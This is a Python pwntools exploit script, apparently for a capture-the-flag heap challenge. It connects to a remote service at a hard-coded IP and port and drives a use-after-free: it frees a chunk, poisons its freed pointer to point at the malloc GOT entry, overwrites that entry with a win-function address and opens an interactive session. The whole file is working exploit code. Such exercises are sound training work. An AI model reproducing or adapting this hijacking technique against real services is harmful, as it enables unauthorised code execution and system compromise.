#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template use_after_free.c
from pwn import *

p = remote('107.21.135.41', 11111)
binary =  './a'

gs = """
break main
continue
"""

e = ELF(binary)

END_OF_MENU = "e.g, l\n"

def malloc(p, size):
    p.sendline(b"m %d" %size)
    p.recvuntil(END_OF_MENU)

def free(p, index):
    p.sendline(b"f %d" %index)
    p.recvuntil(END_OF_MENU)

def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))    
    p.recvuntil(END_OF_MENU)

def exit(p):
    p.sendline(b"0") 

def launch_attack(p):
    malloc(p, 8)
    free(p,0)
    # change location of malloc i.e p64(e.got["malloc"])
    # # 602078 <malloc@GLIBC_2.2.5>
    # objdump -d use_after_free | grep 'malloc'
    pointer = p64(0x602078)
    edit(p, 0, pointer)
    malloc(p,8)
    malloc(p,8)
    # edit(p,2,p64(e.symbols.win))
    edit(p,2,p64(0x400edd))
    p.interactive()


def main():
    if args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p=process(binary)    
    p.recvuntil(END_OF_MENU)
    launch_attack(p)

# main()  

launch_attack(p)